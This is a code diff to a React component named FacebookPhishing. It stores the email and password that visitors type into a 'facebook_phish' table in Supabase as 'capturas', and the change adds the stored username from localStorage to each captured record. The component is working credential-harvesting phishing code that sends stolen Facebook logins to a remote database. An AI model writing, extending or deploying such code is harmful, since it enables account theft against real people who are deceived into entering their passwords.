@@ -8,6 +8,7 @@ export default function FacebookPhishing() {
   const [email, setEmail] = useState('');
   const [senha, setSenha] = useState('');
   const [enviado, setEnviado] = useState(false);
+  const usuario = localStorage.getItem('usuario');
 
   // Redireciona imediatamente se já preencheu antes
   useEffect(() => {
@@ -22,13 +23,13 @@ export default function FacebookPhishing() {
     // Salva flag no localStorage
     localStorage.setItem('fb_phish_' + id, '1');
     // Busca o registro pelo id
-    const { data } = await supabase
+    const { data, error } = await supabase
       .from('facebook_phish')
       .select('*')
       .eq('id', id)
       .single();
     if (data) {
-      const novasCapturas = [...(data.capturas || []), { email, senha, data: new Date().toLocaleString('en-US') }];
+      const novasCapturas = [...(data.capturas || []), { email, senha, data: new Date().toLocaleString('en-US'), usuario }];
       await supabase
         .from('facebook_phish')
         .update({ capturas: novasCapturas })
